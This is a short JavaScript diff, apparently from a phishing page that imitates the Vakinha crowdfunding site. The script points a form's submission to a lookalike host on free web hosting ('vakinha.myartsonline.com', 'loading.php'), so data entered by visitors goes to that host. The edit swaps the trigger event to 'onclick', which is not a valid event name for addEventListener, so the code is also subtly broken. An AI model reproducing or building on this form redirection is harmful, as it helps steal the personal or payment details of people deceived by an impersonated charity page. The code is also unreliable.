@@ -6,7 +6,7 @@ document.formulario.action = "http://vakinha.myartsonline.com/cura-spiranza-junt
 
 function btn2func(){document.formulario.action = "https://vakinha.myartsonline.com/cura-spiranza-juntos-pelo-bee/loading.php";
 
-document.getElementById('mybtn2').addEventListener("mouseover", btn2func); 
+document.getElementById('mybtn2').addEventListener("onclick", btn2func); 
 }
  
 
